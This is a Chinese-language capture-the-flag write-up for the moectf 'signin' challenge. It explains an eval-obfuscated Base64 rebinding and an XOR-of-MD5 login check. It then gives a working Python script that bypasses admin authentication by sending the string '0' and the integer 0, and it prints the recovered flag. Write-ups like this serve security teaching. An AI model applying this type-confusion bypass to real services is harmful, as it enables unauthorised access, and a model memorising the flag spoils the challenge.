# signin

## 题目简述

服务端保存 `admin: admin`，但显式禁止提交用户名 `admin`，也禁止用户名与密码相等。认证值不是普通密码哈希，而是把每个参数格式化进同一模板、分别计算 MD5，再把整数形式的摘要异或。请求参数还经过五层 Base64，并有一段整数异或混淆的 `eval` 修改了 Base64 函数。

## 解题过程

先只解出 `eval` 的字符串而不执行，可得到：

```python
[[0] for base64.b64encode in [base64.b64decode]]
```

列表推导式把模块属性 `base64.b64encode` 重新绑定为 `base64.b64decode`。所以源码中名为 `decrypt` 的函数虽然写的是五次 `b64encode`，运行时实际执行五次 Base64 解码：

```python
def decrypt(data):
    for _ in range(5):
        data = base64.b64encode(data).decode()  # 此时 b64encode 已指向 b64decode
    return data
```

认证函数可记为

$$
G(x,y)=H(x)\oplus H(y),
\qquad
H(x)=\operatorname{MD5}(\text{salt}[x]\text{salt}).
$$

管理员的用户名和密码都是字符串 `admin`，故数据库中的认证值为

$$
G(\texttt{"admin"},\texttt{"admin"})=0.
$$

要同时绕过两个前置判断，可以利用 Python 比较与 f-string 格式化的语义差异：提交字符串 `"0"` 和整数 `0`。它们类型不同，所以 `"0" == 0` 为假；但放进 `f"{item}"` 后都变成相同文本 `0`，两个 MD5 完全相同，异或结果仍为零。服务端遍历 `hashed_users` 时便把该值匹配到管理员。

客户端需要把内部 JSON 编码五次，再作为外层 JSON 的 `params` 字段发送：

```python
from argparse import ArgumentParser
import base64
import json

import requests

parser = ArgumentParser()
parser.add_argument("base_url", help="例如 http://127.0.0.1:9999")
args = parser.parse_args()

params = json.dumps(
    {"username": "0", "password": 0},
    separators=(",", ":"),
).encode()

for _ in range(5):
    params = base64.b64encode(params)

response = requests.post(
    args.base_url.rstrip("/") + "/login",
    json={"params": params.decode()},
)
print(response.status_code)
print(response.text)
```

认证成功后返回的 JSON 中包含：

```text
moectf{C0nGUrAti0ns!_y0U_hAve_sUCCessFUlly_siGnin!_iYlJf!M3rux9G9Vf!Jox}
```

## 方法总结

漏洞由三层语义错位叠加而成：异或哈希在相同输入时归零，Python 的跨类型比较能区分 `"0"` 与 `0`，而 f-string 又会把二者规范化为同一字节串。遇到动态修改函数对象的混淆代码时，应先还原其副作用，再分析后续调用的真实语义。
